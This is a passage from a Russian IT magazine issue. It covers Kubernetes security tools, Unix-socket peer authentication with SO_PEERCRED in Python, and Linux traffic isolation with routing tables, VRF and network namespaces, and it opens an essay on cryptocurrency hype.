тизируемый IP‐адрес. В средах, где требуется наложение, Calico использует
туннелирование  IP‐in‐IP, что поз воляет работать с другими наложенными
сетями.





                       Архитектура Calico

Еще одно полезное приложение — Cilium представляет собой контейнерный
межсетевой  экран. Программа использует  технологию ядра  Linux BPF
для фильтрации, детекта, монито ринга и перенаправле ния данных с исполь‐
зованием вызовов ядра. Cilium помогает развертывать политики доступа
к сети на основе идентифика тора контейнера с использованием меток тегов.
Помимо этого, софтина интерпретирует нес колько протоколов уровня 7,
таких как HTTP или gRPC, что позволяет использовать набор вызовов REST.





                       Архитектура Cilium


Коммерческие решения для безопасности Kubernetes
А теперь — несколь ко слов о коммерческих решениях для обеспечения
безопасности Kubernetes в частнос ти и всей облачной ИТ‐инфраструктуры
вообще. Как показывает практика, использование коммерчес ких Enterprise‐
решений оправданно с точки зрения удобства управления инстру ментами
из единого окна, скорости их работы и более гиб кого масштабирования, пре‐
доставляемого по запросу. Игро ков на рын ке Cloud Security довольно много,
мы остановимся лишь на самых известных и про веренных сервисах.
   Aqua Security — сервис, нацеленный на мониторинг и контроль сос тояния
безопасности для контейнеров и облачных приложений. Сервис представ‐
ляет комплексное решение для автомати зации таких задач, как Vulnerability
Management, Runtime Protection, Secrets Management, Embedded CI/CD Scan‐
ning, Container Firewall, Compliance & Auditing. Некоторые утилиты, исполь‐
зуемые для Enterprise, доступны для бес платного использования на GitHub‐
страничке проекта.





    Комплексный подход к обеспечению безопасности от Aqua Security

Cavirin — еще один известный сервис для авто матического обнаружения
и постоянной оценки гибридной облачной среды без установки end‐point‐
агентов на конечных хостах. Cavirin обеспечивает непрерывный мониторинг
базовых показателей безопасности на основе фреймворков и лучших прак‐
тик, включая PCI, HIPAA, NIST, усиление защиты AWS. Сервис пре дос тавляет
также точную и своевременную информа цию об обновлениях безопасности
и уязвимостях. Архитек тура Cavirin на основе API‐интерфейса легко интегри‐
руется с другими локальными приложениями, а также с SaaS и облачными
сервисами.





                Консоль офицера безопас ности Cavirin

NeuVector — это доволь но извес тная и неплохо зарекомендовавшая себя
сквозная платформа безопасности для всех DevOps‐процессов и, в час тнос‐
ти, для обеспечения безопасности Kubernetes. Услу га включает в себя такие
фичи, как управле ние уяз вимостями для образов, контроль дос тупа, защита
процессов в памяти и файловых систем в контейнерах, файрвол вплоть
до седьмого уров ня OSI.
   Декларативная политика безопасности обес печивает быстрое масшта‐
бирование приложе ний без ручного вмешательства. Решение, поставля емое
NeuVector, — это, по сути, сам контейнер, сертифицированный Red Hat,
и Docker, который легко раз вертывается на каждом хосте, обеспечивая меж‐
сетевое взаимодействие (файрвол), мониторинг про цессов и файловых сис‐
тем внутри контейнера, аудит безопас ности с помощью тестов CIS и сканиро‐
вание уязвимостей.





      Консоль офицера безопас ности NeuVector Kubernetes Security

Sysdig Secure — широко известный стек решений для комплексной безопас‐
ности облачных сервисов. Услуга включает наборы приложе ний для обес‐
печения таких процедур, как Vulnerability management, Compliance, Runtime
security, Forensics, Audit. Помимо решений, позиционируемых как Enterprise,
вендор предлагает качественные опенсорсные утилиты для ауди та и кон троля
безопасности. Также для бес платного использования всем желающим пре‐
доставлен сканер Falco, о котором мы более подробно писали в статье
про безопасность Docker.





             Консоль офицера безопасности Sysdig Secure

Как видишь, очень часто вмес те с проприетарными решениями можно
успешно использовать и бес платные опенсорсные утилиты, что усиливает
суммарный общий эффект от их применения.


До пол нительные утилиты для усиления безопасности Kubernetes
Расскажу о нескольких небольших  утилитах, которые пригодятся  тебе
при формировании пра вильной матрицы дос тупа к инфраструктурным эле‐
ментам K8s‐кластера.
   Audit2rbac — инструмент, позволяющий определить, какие разрешения
необходимы для определенного ПО в составе K8s, при этом он автоматом
генерирует RBAC‐роли.
   Rbac‐manager — еще одна тулза, по сути оператор Kubernetes, который
упрощает управление RBAC‐ролями и привязку их к учетным записям адми‐
нистраторов.
   Kube2iam — тулза, которая подставляет учетные данные из сервиса
управления доступом AWS IAM для всех контейнеров в кластере.


И в завершение нашего сегодняшнего материала несколько интересных
ресурсов по теме обеспечения безопасности Kubernetes, включающих best
practices, обзоры утилит и примеры некоторых системных команд.
   Kubernetes Security resource center of O’Reilly — онлайн‐версия книги Ku‐
bernetes Security Operating Kubernetes Clusters and Applications Safely изда‐
тельства O’Reilly Media. Наибо лее полный и содержательный гайд по пла‐
нированию и настрой кам безопасности кластеров на базе Kubernetes. Элек‐
тронную версию книги можно бесплатно ска чать здесь.
   Overview of Cloud Native Security — официальный документ от раз работ‐
чиков  Kubernetus  с описанием общих рекомендаций по обеспечению
безопасности.
   The Ultimate Guide to Kubernetes Security — неплохая обзорная статья, опи‐
сывающая некоторые векторы  атак, проблемы безопасности и типовые
рекомендации по защите K8s, собранные компани ей NeuVector — разработ‐
чиком решений ИБ для облачных сред.
   Kubernetes Security Best‐Practices — отлично структурированный и содер‐
жательный документ с описанием функций безопасности Kubernetes, которые
можно настроить самос тоятельно. Этот же документ есть и на GitHub.



ЗАКЛЮЧЕНИЕ
Сегодня мы разоб рали очень важ ную для всего DevOps‐сообщества тему
безопасности системы контейнерной оркес тра ции Kubernetes. Теперь ты
имеешь представление об основных векторах  атак, типовых проблемах
и потенциальных рисках при использовании этого сверхпопулярного опен‐
сорсного фреймвор ка, поз накомился с общими требованиями к проекти‐
рованию и развертыванию K8s с точки зрения безопас ности и знаешь нес‐
колько системных команд, позволяющих обезопа сить свой кластер и спать
спокойнее по ночам.
АДМИН

 ПОЧТИ SSO





                                      Даниил Батурин
                                  Координатор проекта VyOS (https://vyos.io),
                                    «языковед», функциональщик, иногда сетевой
                                               администратор.
                                                      daniil@baturin.org





      ИСПОЛЬЗУЕМ СИСТЕМНУЮ
  АУТЕНТИФИКАЦИЮ С СОКЕТАМИ UNIX





Никто не любит лишний раз вводить пароли. В мире
веб‐приложений  про токолы  для SSO  (Single  Sign‐On)
широко распространены и легко реализуемы благодаря
встроенной в браузер возможности хранить cookie. Со сто‐
роны безопас ности это не лучшее решение. Ряд популярных
приложений,  к примеру  консольный  клиент  PostgreSQL
(psql), предоставляют такую возможность для локальных
подключений через сокеты UNIX. В этой статье мы рассмот‐
рим, как это сделать с помощью опции SO_PEERCRED.


В качестве примера мы напишем сервер, который прос то хранит какое‐то
число, при этом пользователи из группы wheel могут его изме нять, а все
остальные — только получать значение. Писать будем на Python, но все ска‐
занное применимо к любому языку.
  В этой статье речь идет о Linux, если не указано обратное.


АБСТРАКТНЫЕ СОКЕТЫ LINUX
Для взаимодействия с сервером мы будем исполь зовать вари ант UNIX do‐
main sockets — abstract namespace sockets. В отличие от сетевых сокетов,
в случае с локальными сокетами UNIX ядро зна ет, какой процесс подключает‐
ся к сокету, и знает все о пользователе (соз дателе) процесса, что и позволя‐
ет переиспользовать системную аутентифика цию.
  В классической реализации сокеты UNIX представляют собой файлы.
Это позволяет применить к ним пра ва доступа и запретить пользователям
или группам подключаться к ним, но более сложную модель привилегий
на этом не построить.
  Основной недостаток клас сичес кой реализации — опция SO_REUSEADDR
для них не работает. Файл сокета должен быть создан процессом, который
на нем слушает. Если про цесс упал, а файл сокета остался, то новому про‐
цессу сначала нужно его удалить. Пра вильно написанный сервер дол жен
использовать lock‐файлы, чтобы предотвратить слу чайный запуск нес кольких
экземпляров процесса и обеспечить безопас ное удаление старого файла.
  Для решения этой проб лемы в Linux существу ют так называемые abstract
namespace sockets. По сво ей сути они идентичны традиционным сокетам
UNIX, но не являются файлами и автомати чес ки исчезают с завершением
процесса, который их соз дал. К ним также неп рименимы обычные права дос‐
тупа, и авторизация оста ется на совести при ложения — но мы ведь к этому
и стремимся.
   Чтобы создать абстрактный сокет, нужно добавить в начало его «пути
к файлу» нулевой байт. В остальном все так же, как с обычными.


ПИШЕМ СЕРВЕР
Для начала мы напишем основу для сервера, пока без авторизации. Чтобы
не писать разбор сообщений, мы сделаем всего две команды без аргумен‐
тов: read (вернуть значение счетчика) и inc (увеличить счетчик на единицу).
  Сокет мы назовем counter‐server. Соответственно, путь его будет
'\0counter‐server'.


#!/usr/bin/env python3


import os
import socket


SOCK_FILE = '\0counter‐server'


# Счетчик
counter = 0


# Создаем сокет
sock = socket.socket(family=socket.AF_UNIX, type=socket.SOCK_STREAM)
sock.bind(SOCK_FILE)
sock.listen()


while True:
    conn, _ = sock.accept()


    command = conn.recv(1024).decode().strip()


    if command == 'inc':
        print("Received an increment request")
        counter += 1
        response = "Success"
    elif command == 'read':
        print("Received a read request")
        response = "Counter value: {0}".format(counter)
    else:
    response = "Invalid command"


    conn.send(response.encode())
    conn.send(b'\n')
    conn.close()

Попробуем запустить его:


$ sudo ./counter‐server.py
Counter server started

Перейдем в другую кон соль и попробуем подклю читься с помощью socat.
В случае с обычным stream‐сокетом протокол был бы UNIX‐CONNECT, но пос‐
кольку наш — «необыч ный», нужен ABSTRACT‐CONNECT.


$ socat ‐ ABSTRACT‐CONNECT:counter‐server
inc
Success


$ socat ‐ ABSTRACT‐CONNECT:counter‐server
read
Counter value: 1


ДОБАВЛЯЕМ АВТОРИЗАЦИЮ
Теперь переходим к получению данных о подклю чившемся процессе через
SO_PEERCRED. Для традиционных сокетов и абстрактных она работает оди‐
наково.
  Формально, чтобы включить эту опцию, нуж но пос тавить сокету флаг SO_‐
PASSCRED = 1. На практике из Python 3.7 на ядре 5.0.x работает и без его
явной установки, но лишним не будет.


sock = socket.socket(family=socket.AF_UNIX, type=socket.SOCK_STREAM)
# Установка опции для передачи данных о клиенте
sock.setsockopt(socket.SOL_SOCKET, socket.SO_PASSCRED, 1)
sock.bind(SOCK_FILE)
sock.listen()

Прочитать данные о клиенте можно с помощью функции socket.getsockopt
с флагом SO_PEERCRED. В качестве третьего аргу мента обязательно нужно
указать размер буфера для чтения. Ука жем 1024 — это гораздо больше, чем
достаточно:


cred = conn.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED, 1024)

Эта функция вернет нам объект типа bytes, из которого еще нужно извлечь
информацию. Увы, встроенной функциональности для этого в Python нет,
поэтому разбирать при дется самим. Из man 7 unix можно узнать, что она
возвращает запись типа ucred из <sys/socket.h>:


struct ucred {
    pid_t pid;    /* process ID of the sending process */
    uid_t uid;    /* user ID of the sending process */
    gid_t gid;    /* group ID of the sending process */
};

Стандарт POSIX не определяет размер этих типов, но на практике в Linux они
все — 32‐разрядные знаковые целые. Таким образом, мы можем разоб рать
ее на части с помощью struct.unpack('iii', cred) (не забудь добавить
import struct).
  Модифицируем основной цикл нашего сервера:


while True:
    conn, _ = sock.accept()


    cred = conn.getsockopt(socket.SOL_SOCKET, socket.SO_PEERCRED,
1024)
    pid, uid, gid = struct.unpack('iii', cred)
    print("Connection from PID={0} UID={1} GID={2}".format(pid, uid,
gid))

Теперь, если запустить сервер и подключиться к нему, мы увидим картину
вроде такой:


$ sudo ./counter‐server.py
Counter server started
Connection from PID=8108 UID=1003 GID=1003
Received a read request

Уже неплохо. Осталось только сравнить идентифика тор группы (GID) с жела‐
емой группой wheel.


ПОЛУЧАЕМ ИНФОРМАЦИЮ О ГРУППАХ
Эта часть самая простая и легко выполняется средствами стандартной биб‐
лиотеки Python.
  Функции для этих целей находятся в модулях pwd и grp. Имена функций
и возвращаемые сло вари совпадают с POSIX вплоть до названий полей, хотя
в Python с его поддержкой пространств имен grp_gid и подобное выглядит
немного странно.


import pwd
import grp


GROUP_ALLOW = 'wheel'

Для примера мы исполь зуем группу администраторов по умолчанию в сис‐
темах на основе Red Hat, но на ее мес те могла быть любая группа.
  Перепишем обработку команды inc с проверкой прав пользователя. Пос‐
кольку по умолчанию процесс получа ет GID основной (первой) группы поль‐
зователя, для удобства в ущерб про изво дительнос ти мы получим имя поль‐
зователя по его UID с помощью getpwuid и будем проверять наличие этого
имени в группе (поле gr_mem в словаре, который воз вращает grp.getgrnam):


if command == 'inc':
        print("Received an increment request")


        login = pwd.getpwuid(uid).pw_name
        group = grp.getgrnam(GROUP_ALLOW)
        if login in group.gr_mem:
            counter += 1
            response = "Success"
        else:
            response = "You don't have a permission"

Теперь пользователь будет получать сооб щение об ошибке, если не состоит
в группе wheel:


$ sudo ‐u nobody socat ‐ ABSTRACT‐CONNECT:counter‐server
inc
You don’t have a permission


ПЕРЕНОСИМОСТЬ
К сожалению, SO_PEERCRED не стандарти зова на в POSIX, и детали реали‐
зации в разных системах нес колько отличаются. В частности, OpenBSD
использует другой порядок зна чений: uid, gid, pid, а не pid, uid, gid. Дру‐
гие системы исполь зуют похожие по смыслу, но отличающиеся в реализации
опции, например SCM_CRED в FreeBSD. В самом Linux также есть механизм
SCM_CREDENTIALS, позволя ющий передавать любой UID и GID, на которые
у пользователя есть пра ва.
   Универсальную библиотеку, которая скрывала бы эти раз личия от поль‐
зователя и работала одинаково на всех системах, я не нашел, но частичные
реализации для разных языков отыскать вполне можно.
   Что интересно, относительно перено симая getpeereid(), которая воз‐
вращает только UID и GID, в стандартную биб лиотеку Python и многих дру гих
языков не входит. Но если задаться целью, все реализуемо.
АДМИН
ИСКУССТВО
ИЗОЛЯЦИИ

ИЗУЧАЕМ МЕХАНИЗМЫ
ИЗОЛЯЦИИ ТРАФИКА
В LINUX





    Даниил Батурин
 Координатор проекта VyOS
 (https://vyos.io), «языковед»,
  функциональщик, иногда
  сетевой администратор.
      daniil@baturin.org





Изоляция трафика разных сетей в пре делах одной ОС рас‐
пространена повсеместно. Для конечных пользователей она
незаметна — в этом ее цель. Но зна ешь ли ты, какие средс‐
тва для разных уровней изоляции предоставляет ядро Linux
и  как  ими  воспользоваться  самому,  не  рассчитывая
на интегрированные средства управления вроде Docker?
Давай разбираться.


Изоляцию частей сетевого стека можно исполь зовать по‐разному. Провай‐
деры предоставляют клиентам виртуальные выделенные линии и вынуждены
как‐то обходить конфликты адресов пользователь ских сетей, чтобы агрегиро‐
вать их трафик на одном устройстве. Админы и разработчики изолиру ют при‐
ложения в контейнерах, чтобы не запускать отдельную копию всей ОС в вир‐
туальной машине, и кон тейнер вза имо действу ет с миром через виртуальный
интерфейс, хотя ядро у всех контейнеров общее.


             INFO

                   В этой статье пред полагается, что у тебя свежее
                      ядро — 4.8 или новее.



МНОЖЕСТВЕННЫЕ ТАБЛИЦЫ МАРШРУТИЗАЦИИ
Эта возможность известна каждому, кто когда‐либо делал балансировку меж‐
ду двумя провайдерами. Кроме таблицы маршрутизации по умол чанию, в Lin‐
ux можно создать до 255 независимых друг от дру га таблиц.
   Таблица по умол чанию называется main, и ей прис воен номер 254. Имен‐
но в нее попадают маршру ты, если добавить их с помощью ip route add
или route без допол нитель ных параметров. Еще пара таблиц зарезер‐
вирована, а с остальными можно делать что хочешь.
   Какая таблица для какого трафика будет исполь зоваться, определяется
правилами, ты можешь создать их с помощью ip rule add. Вывод ip rule
show покажет правила по умолчанию:


$ ip rule show
0:  from all lookup local
32766:  from all lookup main
32767:  from all lookup default

Символьные имена таблиц можно найти (и перенас троить) в файле /etc/
iproute2/rt_tables. У пра вила про таблицу main (254) такой низкий при‐
оритет, чтобы пользовательские таблицы с мень шими номерами обрабаты‐
вались до нее. Как видим, никако го особого ста туса у main на самом деле
нет, это правило можно было бы уда лить или переопределить.
   Таблица local, которая фигурирует в правиле 0, содержит специальные
маршруты для локальных и широковещательных адресов. Например, прис‐
воение адреса 192.0.2.1/24 интерфейсу eth0 создает вот такие маршру ты
в этой таблице:


broadcast 192.0.2.0 dev eth0 proto kernel scope link src 192.0.2.1
local 192.0.2.1 dev eth0 proto kernel scope host src 192.0.2.1
broadcast 192.0.2.255 dev eth0 proto kernel scope link src 192.0.2.1

Ядро управляет этой таблицей самос тоятельно. Знать о ней полезно, но тро‐
гать в ней ничего не нужно.


Соз даем свои таб лицы
Новые таблицы создаются авто матически, если добавить в них маршрут. Ука‐
зать таблицу можно опцией table:


$ sudo ip route add 203.0.113.0/24 via 192.0.2.10 table 200

Чтобы просмотреть маршруты в новой таблице, нужно добавить ту же опцию
к ip route show.


$ ip route show table 200
203.0.113.0/24 via 192.0.2.1 dev eth0


             INFO

                   В iproute2 все команды можно сок ращать. Нап‐
                       ример: ip ro sh t 200.


Сами по себе таблицы не приносят никакой поль зы — нужны правила,
которые направят в них трафик.


Соз даем правила
Правила создаются командой ip rule add. Самый рас пространенный вари‐
ант применения — source‐based routing, к примеру отправка трафика разных
сетей через разных провайдеров.
  Предположим, что у нас есть локальная сеть 10.0.0.0/24 и мы хотим отпра‐
вить ее трафик в интернет через маршру тиза тор 192.0.2.10, а не основной
маршрут по умолчанию. Это можно сделать командами


$ sudo ip route add default via 192.0.2.10 table 200
$ sudo ip rule add from 10.0.0.0/24 table 200


        WWW

                     За детальными инструкциями по работе с нес‐
                        колькими  провайдерами  можно  обратиться
                          к классическим lartc.org HOWTO или policyrout‐
                           ing.org, а за справкой по синтаксису — к man
                   ip‐rule или моему руководству.



Классификация пакетов по меткам netfilter
Факт первый: воз можности классификации трафика мож но серь-
езно расширить с помощью опции fwmark. Сама команда ip rule add
поддерживает не так много собственно сетевых опций: from/to (адрес
источника и назначений), iif/oif (входной и выходной интерфейс), ipproto
(протокол), sport/dport (порт источника и назначения), tos (значение Type
of Service).
  К счастью, netﬁlter умеет добавлять к пакетам метки, можно ссы латься
на них в опции fwmark и строить пра вила даже для самых экзотических ситу‐
аций.
   Главное — помнить порядок обработки пакетов в ядре и добавлять пра‐
вила для установ ки меток в цепочку, которая обра баты вается до маршрутиза‐
ции пакетов: например, mangle OUTPUT для локального трафика и mangle
FORWARD для трафика из других сетей.


             INFO

                    Порядок  обработки  пакетов  отлично  показан
                       на диаграмме.


В качестве абсурдного, но показа тельного при мера мы отправим ICMP‐
пакеты размером больше ста байт через шлюз 192.0.2.20. Для простоты тес‐
тирования мы сделаем, чтобы пра вило применя лось к локальным пакетам,
поэтому метку мы ставим в цепочке mangle OUTPUT:


$ sudo iptables ‐t mangle ‐I OUTPUT ‐m length ‐‐length 100: ‐p icmp
‐j MARK ‐‐set‐mark 0xdeadbeef
$ sudo ip route add default via 192.0.2.20 table 201
$ sudo ip rule add fwmark 0xdeadbeef table 201

Чтобы протестировать в реальнос ти, замени 192.0.2.10 на какой‐нибудь хост
из твоей сети — ядро Linux не добавляет маршру ты через заведомо недос‐
тижимый шлюз.


Классификация по иден тификаторам пользовате лей
Факт вто рой: правила мож но применять к отдельным пользовате-
лям. Возможных применений два. Первое — имитировать VRF или netns,
запустив процесс от имени пользователя, к которому применяется правило.
Так делать не стоит, в новых ядрах есть куда лучшие решения.
  Однако эта возможность может помочь в отладке правил. Проверить,
как работают маршруты, может быть не так просто, особенно если нет дос‐
тупа ко всем хостам. В этом случае можно при менить правило к пользовате‐
лю и тестировать от его имени. Этим же способом можно завернуть весь тра‐
фик пользователя в VPN‐туннель, не тро гая системный трафик. Пред‐
положим, у нас поднят OpenVPN с интерфейсом tun0 и есть пользователь
test с id=1000. Отправим весь его трафик через VPN:


$ sudo ip route add default dev tun0 table 205
$ sudo ip rule add uidrange 1000‐1000 table 205

Как видим, возможные применения множественных таблиц и правил весьма
широки. Однако они не позволяют разрешить конфликт адресов между сег‐
ментами сети или полностью изолировать тра фик процесса. Для этих целей
нужно применять VRF или network namespaces. Начнем с VRF.


VRF
VRF (Virtual Routing and Forwarding) наиболее популя рен среди провайдеров,
которым нужно подклю чить независимых клиентов к одному физическому
устройству. С его помощью можно ассоциировать сетевые интерфейсы
с отдельными таблицами маршру тизации. Если думаешь, что того же эффекта
можно достигнуть опцией iif/oif в ip rule add, то спешу сообщить тебе,
что это не совсем так.
  С «простыми» таблицами и правила ми мы можем добавить свои маршруты
в отдельную таблицу, но служеб ные маршру ты ядра — local и broadcast,
которые нужны для правиль ной работы с адресами интерфейса, остаются
в таблице по умол чанию. Это и делает невоз можным подключение клиентов
с одинаковыми или пересекающимися сетями к одно му маршрутизатору.
  Каждый раз, когда мы присваиваем интерфейсу адрес, ядро создает уже
описанные выше local‐ и broadcast‐маршруты в таб лице local и маршрут
к сети в таблице main. Нап ример, присвоение интерфейсу eth0 адре‐
са 192.0.2.100/24 создает маршрут вида


192.0.2.0/24 dev eth1 proto kernel scope link src 192.0.2.100

Такие маршруты принято называть connected routes. Если бы их не было, соз‐
дать маршрут вроде ip route add default via 192.0.2.1 было бы невоз‐
можно: адрес 192.0.2.1 считался бы недос тижимым из‐за отсутствия явного
маршрута к 192.0.2.0/24.
  VRF позволяет разрешить конфликты адресов, перенеся в отдельную таб‐
лицу все ассоциированные с сетевым интерфейсом маршру ты — как поль‐
зовательские, так и служеб ные.


Соз даем VRF
Для примера создадим VRF с названием customer1 и привяжем его к таб‐
лице маршрутизации 50:


$ sudo ip link add customer1 type vrf table 50
$ sudo ip link set dev customer1 up

Он выглядит как виртуальная сетевая карта. Все сетевые интерфейсы ядро
создает в выключенном сос тоянии, поэтому без второй команды не обой‐
тись: перед исполь зованием его нужно включить. Просмотреть VRF можно
командой ip vrf show:


$ ip vrf show
 Name              Table
 ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 customer1           50


Присваиваем VRF сетевые интерфейсы
В VRF можно добавить любые интерфейсы, как физические, так и виртуаль‐
ные (к примеру, туннели). Для демонс трации мы соз дадим интерфейс типа
dummy (аналог loopback) и присвоим ему адрес 10.133.0.1/24:


$ sudo ip link add dev dum1 type dummy
$ sudo ip link set dum1 up
$ sudo ip address add 10.133.0.1/24 dev dum1

Каждый раз, когда мы присваиваем интерфейсу адрес, в таб лице main появ‐
ляется маршрут к его сети:


$ ip route show 10.133.0.1/24
10.133.0.0/24 dev dum1 proto kernel scope link src 10.133.0.1

Теперь привяжем наш интерфейс к VRF customer1:


$ sudo ip link set dum1 master

Картина в ip vrf show не изменится — к сожалению, эта команда не показы‐
вает принадлежность интерфейсов VRF. Все интерфей сы определенного VRF
можно увидеть в выводе ip link show vrf $VRF:


$ ip link show vrf customer1
6: dum1: <BROADCAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc noqueue master
customer1 state UNKNOWN mode DEFAULT group default qlen 1000
    link/ether 8e:6f:b6:9a:df:e0 brd ff:ff:ff:ff:ff:ff

Если выполнить ip ro sh 10.133.0.0/24, мы увидим, что маршрут к этой
сети исчез. Ядро перенес ло его и все остальные служебные маршруты
для этой сети в таблицу 50:


$ ip ro sh t 50
broadcast 10.133.0.0 dev dum1 proto kernel scope link src 10.133.0.1
10.133.0.0/24 dev dum1 proto kernel scope link src 10.133.0.1
local 10.133.0.1 dev dum1 proto kernel scope host src 10.133.0.1
broadcast 10.133.0.255 dev dum1 proto kernel scope link src 10.133.0.
1

Если удалить интерфейс из VRF командой


$ sudo ip link set dum1 nomaster

маршруты вернутся обратно.


Вы пол няем коман ды внутри VRF
VRF изолирует именно сети, а не приложения. Один и тот же процесс может
подклю читься к несколь ким разным VRF. Работу с VRF с точки зре ния раз‐
работчика приложений мы оста вим за кадром.
   Знать про существование VRF нужно очень узкому классу программ:
в основном демонам протоколов маршрутизации и раз личным реализаци ям
VPN. Любую  программу  очень  просто  запустить  внутри  любого VRF
с помощью команды ip vrf exec $VRF $COMMAND.
  К примеру, выполним ping к адресу самого dum1. Из VRF по умол чанию он
не сработает, посколь ку его маршру ты были уда лены из основной таблицы:


$ ping 10.133.0.1
PING 10.133.0.1 (10.133.0.1) 56(84) bytes of data.
^C
‐‐‐ 10.133.0.1 ping statistics ‐‐‐
4 packets transmitted, 0 received, 100% packet loss, time 58ms

Однако внутри VRF customer1 все работа ет:


$ sudo ip vrf exec customer1 ping 10.133.0.1
PING 10.133.0.1 (10.133.0.1) 56(84) bytes of data.
64 bytes from 10.133.0.1: icmp_seq=1 ttl=64 time=0.042 ms

Таким способом можно выполнить любую команду (включая другую команду
ip). Это существенно упрощает отладку и тестирование настроек VRF
по сравнению с простыми таблицами и правила ми.


СЕТЕВЫЕ ПРОСТРАНСТВА ИМЕН (NETWORK NAMESPACES)
VRF обеспечивает изоляцию только на сетевом уровне. Канальный уровень
остается общим для всех VRF, и, к примеру, sudo ip vrf exec customer1
ip link list покажет нам все интерфейсы: и при надлежащий нашему VRF
dum1, и все остальные. Это может быть как преимуществом, так и недос‐
татком.
   Если VRF мало, можно привлечь сетевые пространс тва имен (netns) —
самый глубокий уровень изоляции. Именно его используют контейнеры вро‐
де LXC. Они создают полную копию сетевого стека, и процессы в одном
пространстве имен не могут увидеть ничего из дру гих — даже физические
сетевые интерфейсы.


Соз даем пространство имен
Создать новое пространс тво имен можно командой ip netns add, а прос‐
мотреть список существующих — командой ip netns show.


$ sudo ip netns add mynamespace
$ ip netns show
mynamespace

Для простоты тестирования в пределах отдельно взятой машины создадим
еще один dummy‐интерфейс dum2 и прис воим его нашему пространству
имен:


$ sudo ip link add dum2 type dummy
$ sudo ip link set dum2 up
$ sudo ip link set dum2 netns mynamespace

Если в случае с VRF мы мог ли увидеть наш dum1 в обычном выводе ip link
list, то с пространства ми имен все ина че: dum2 исчезнет отту да и увидеть
его можно будет толь ко изнутри mynamespace. Давай убедимся.


Вы пол няем коман ды
Выпол нить команду внутри пространства имен мож но с помощью ip netns
exec $NAMESPACE $COMMAND. Если выполнить таким способом ip link list
внутри mynamspace, мы увидим dum2 и копию интерфейса lo (loopback) —
и ничего больше.


$ sudo ip netns exec mynamespace ip link list
1: lo: <LOOPBACK> mtu 65536 qdisc noop state DOWN mode DEFAULT group
default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
7: dum2: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN mode
DEFAULT group default qlen 1000
    link/ether ca:00:b9:06:49:70 brd ff:ff:ff:ff:ff:ff

В свежих версиях iproute2 (в моей 5.0.0 точно) есть более короткий способ —
ip ‐n $NAMESPACE:


$ sudo ip ‐n mynamespace link show dum2
7: dum2: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN mode
DEFAULT group default qlen 1000
    link/ether ca:00:b9:06:49:70 brd ff:ff:ff:ff:ff:ff

Нужно отметить, что при передаче интерфей са в дру гое пространство имен
он всегда будет вык лючен и с него будут удалены все адреса, поэтому
в скриптах инициализации и подобном поднимать интерфейс и настраивать
его нужно уже после ip link set ... netns.


Взаимо действу ем с дру гими пространствами имен
Как видим, устройства и процессы внутри пространства имен оказываются
в полной изоляции. Вза имо действие меж ду раз ными пространствами воз‐
можно только через пару виртуальных интерфей сов. Для этого используются
специальные интерфейсы типа veth. Они всегда создаются парами, создать
только один невозможно:


$ sudo ip link add name veth1 type veth peer name veth2

Устройство veth1 мы оставим в пространс тве имен по умолчанию, а veth2
добавим в mynamespace, затем включим оба интерфейса (они, как обычно,
создаются выключенными):


$ sudo ip link set dev veth2 netns mynamespace
$ sudo ip ‐n mynamespace link set veth2 up
$ sudo ip link set dev veth1 up

Мы присвоим адреса обо им интерфейсам, и взаимодей ствие между прос‐
транствами имен будет орга низовано так же, как маршрутизация трафика
между разными хостами. Используем сеть 10.136.0.0/30 для связи между
ними:


$ sudo ip addr add 10.136.0.1/30 dev veth1
$ sudo ip ‐n mynamespace address add 10.136.0.2/30 dev veth2
$ ping 10.136.0.2
PING 10.136.0.2 (10.136.0.2) 56(84) bytes of data.
64 bytes from 10.136.0.2: icmp_seq=1 ttl=64 time=0.057 ms

Добавим адрес интерфейсу dum2 и  статический маршрут  к  его  сети
из основного пространства имен.


$ sudo ip ‐n mynamespace address add 10.134.0.1/24 dev dum2
$ sudo ip ro add 10.134.0.0/24 via 10.136.0.2
$ ping 10.134.0.1
PING 10.134.0.1 (10.134.0.1) 56(84) bytes of data.
64 bytes from 10.134.0.1: icmp_seq=1 ttl=64 time=0.036 ms

Поскольку связь между прос транс твами имен неотличима от физического
соединения или туннеля, с их помощью можно тес тировать сценарии нас‐
тройки сети без создания отдельных контейнеров или виртуальных машин.
  Существует несколько проектов для интеграции с systemd, поз воляющих
упростить изоляцию приложений, например systemd‐named‐netns.


ИТОГО
Как видишь, ядро Linux предоставляет механизмы изоляции сетевого трафика
на все случаи жизни — от минимальной до полной. Надеюсь, эта статья
поможет тебе выбрать нужный для твоих задач и эффективно им вос поль‐
зоваться.
GEEK





   КРИПТА
 БЕЗ ЭМОЦИЙ
      ИЩЕМ ЗДРАВЫЙ СМЫСЛ
     В КРИПТОВАЛЮТНОЙ ШУМИХЕ



Криптовалюты то входят в моду, то кажутся
полным  разочарова нием.  Кто‐то  дела ет
на  них  миллионы,  а  кто‐то  остается
без копейки. В этой статье мы попыта емся       Андрей Письменный
                                                                                      Главный редактор
                                                                                      apismenny@gmail.comоставить в стороне личные переживания
и  попытаться  понять, можно  ли  ждать
от крипты какого‐то реального прока.


Кто сде лал день ги по‑быс тро му
Криптолихорадка 2017 года еще жива в наших воспоминаниях. Кто‐то бежал
скупать видеокарты, кто‐то из‐за цены на элек тричес тво прописался на даче
в Иркутске. Кто‐то, следуя примеру волка с Уолл‐стрит, устраивал памп
и дамп в сговоре с такими же волками и нагревал восторженных обывателей
на разнице в кур сах.
   Ну а самые предприимчивые создавали за буг ром свою криптовалюту
на «умных» контрактах и сос тригли немного бабла на ICO. Я слышал об одном
примере, где это «немного» составляло $40 000 000. А чтобы не прослыть
мошенниками они нанимали в СНГ дешевую рабочую силу, которая бы ими‐
тировала бурную деятельность и показывала хоть что‐то работающее.
   Как раз в таком сервисе успел поработать один мой знакомый по ставке
$30 в час, 50‐60 часов в неделю. Правда проработал он там все го пол тора
месяца.  Стартап,  как  ты  догадываешь ся,  ничего  реального  делать
не собирался и все, кто был там на зарплате, считай, играли роли в театраль‐
ной постанов ке.
  Основатели в итоге сняли все сливки, а интерес к стартапу начал осты вать
вместе со всем крипторынком. В этой исто рии хорошо то, что основате ли
просто не скрылись пос ле ICO в неизвес тном направле нии со всеми день‐
гами, как было во многих дру гих случаях, а хотя бы заплатили программистам
за их незавершенную и бес полезную работу.
